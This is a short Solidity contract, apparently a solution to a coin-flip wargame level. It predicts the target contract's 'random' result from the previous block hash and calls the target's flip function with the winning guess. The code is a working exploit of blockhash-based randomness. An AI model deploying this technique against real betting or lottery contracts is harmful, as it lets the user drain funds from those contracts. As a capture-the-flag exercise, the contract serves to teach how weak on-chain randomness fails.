/**
 *Submitted for verification at Etherscan.io on 2022-05-02
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// create interface
contract realInstance {
  function flip(bool _guess) public returns (bool) {}
}

contract CoinFlipCheat {
  //address realInstance = 0x2e1866F740B4590b90926422b991E11C8C250217;  // this is the hard coding i wanna avoid.
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  event flipped(string, uint256, uint256);  // for testing my flipcheats
  
  realInstance realAddy;
  function setCoinFlipAddy(address _r) public {
    realAddy = realInstance(_r);
  }    

  function flipCheat() public {
    uint256 blockNum = block.number - 1; 
    uint256 blockValue = uint256(blockhash(blockNum));

    uint256 coinFlip = blockValue / FACTOR;

    if (coinFlip == 1) { 
        emit flipped("trewww", blockNum, blockValue);
        realAddy.flip(true);
    }    
    else {
        emit flipped("faaalsey", blockNum, blockValue);
        realAddy.flip(false);
    }    
  }
}